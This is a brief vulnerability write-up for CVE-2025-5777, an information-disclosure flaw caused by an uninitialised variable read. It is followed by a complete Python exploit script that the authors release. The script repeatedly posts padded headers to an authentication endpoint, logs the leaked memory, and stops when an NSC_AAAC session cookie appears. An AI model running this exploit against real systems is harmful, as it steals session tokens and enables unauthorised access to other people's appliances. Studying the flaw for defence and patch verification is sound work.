By diffing the patch, we successfully reproduced CVE-2025-5777. Due to insufficient validation of the special character "=", the conditional branch takes the wrong path, causing an uninitialized variable to be read and later output, resulting in information disclosure.

As the underlying principle has already been disclosed in existing analysis articles, we are releasing the exploit script.

```PY
import requests
import re
import sys
import time
from urllib3.exceptions import InsecureRequestWarning
from tqdm import tqdm
import random
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
def send_request_with_custom_padding(host, port, padding_length, file):
    url = f"https://{host}:{port}/p/u/doAuthentication.do"
    base_value = "same-origin"
    padded_value = base_value + "a" * padding_length
   
    headers = {
        "Host": host,
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": f"https://{host}",
        "Sec-Fetch-Site": "a"* padding_length
    }
   
    try:
        response = requests.post(
            url,
            data="login",
            headers=headers,
            verify=False,
            timeout=10
        )
       
        #print(response.headers)
        #print(response.content)
        initial_value_pattern = re.compile(b'<InitialValue>(.*?)</InitialValue>', re.DOTALL)
        initial_value_match = initial_value_pattern.search(response.content)
       
        if initial_value_match:
            initial_value = initial_value_match.group(1)
            #print("\nExtracted InitialValue:")
            #print(f"Raw bytes: {initial_value}")
            file.write(str(initial_value))
            if "NSC_AAAC" in str(initial_value):
                return True
            '''
            #hex_value = binascii.hexlify(initial_value).decode()
            #print(f"Hex representation: {hex_value}")'''
           
            ''' 
            try:
                str_value = initial_value.decode('utf-8', errors='backslashreplace')
                print(f"String representation: {str_value}")
            except Exception as e:
                print(f"Cannot decode as string: {e}")'''
        else:
            print("\nNo InitialValue tag found in response")
        '''
        cookies_text = str(response.headers.get('Set-Cookie', ''))
       
        if "NSC_AAAC" in cookies_text:
            pattern = r"(?i)NSC_AAAC=([A-Za-z0-9]{65})"
            match = re.search(pattern, cookies_text)
           
            if match:
                print(f"Cookie is valid: NSC_AAAC={match.group(1)}")
            else:
                pattern1 = r"(?i)NSC_AAAC=([A-Za-z0-9]+)"
                match1 = re.search(pattern1, cookies_text)
                if match1:
                    print(f"Cookie not valid: NSC_AAAC={match1.group(1)}")
                    print(f"Cookie length: {len(match1.group(1))}")
        else:
            print("No NSC_AAAC cookie found in response")
           
        print(f"Status code: {response.status_code}")
        print(f"Response size: {len(response.content)} bytes")
        '''
    except Exception as e:
        print(f"Error: {str(e)}")
if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"Usage: python3 {sys.argv[0]} <ip> <port> <try_attempts>")
        exit(1)
   
    host = sys.argv[1]
    port = int(sys.argv[2])
    padding_length = int(sys.argv[3])
    file=open("%s.log"%host,'w')
    print(f"Sending request to {host}:{port} with try attempts {padding_length}")
    numbers=list(range(100,1001,100))
    random_number=random.choice(numbers)
    for i in tqdm(range(0,padding_length)):
        flag=send_request_with_custom_padding(host, port, random_number ,file)
        if flag:
            print(f"Found Cookie")
            break
```
